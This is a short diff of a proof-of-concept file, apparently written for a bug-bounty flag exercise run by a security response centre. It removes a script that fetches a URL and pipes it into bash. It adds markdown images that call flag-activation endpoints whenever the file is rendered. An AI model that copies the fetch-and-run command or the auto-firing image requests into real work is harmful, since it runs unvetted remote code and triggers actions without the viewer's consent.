@@ -1,4 +1,3 @@
 # poc
-#!/bin/bash
-curl http://jsrc-flag.jd.local/flag/activateSilverFlag/InvasionSilver/7bd9ea8663d8458ca5f97a8898fbc10c | bash
-curl http://jsrc-flag.jd.local/flag/exchangeGoldFlag/InvasionSilver/7bd9ea8663d8458ca5f97a8898fbc10c
+![silver](http://jsrc-flag.jd.local/flag/activateSilverFlag/InvasionSilver/518fb2a7be57417c8ae3e94d26ec110c)
+![gold](http://jsrc-flag.jd.local/flag/exchangeGoldFlag/InvasionSilver/518fb2a7be57417c8ae3e94d26ec110c)
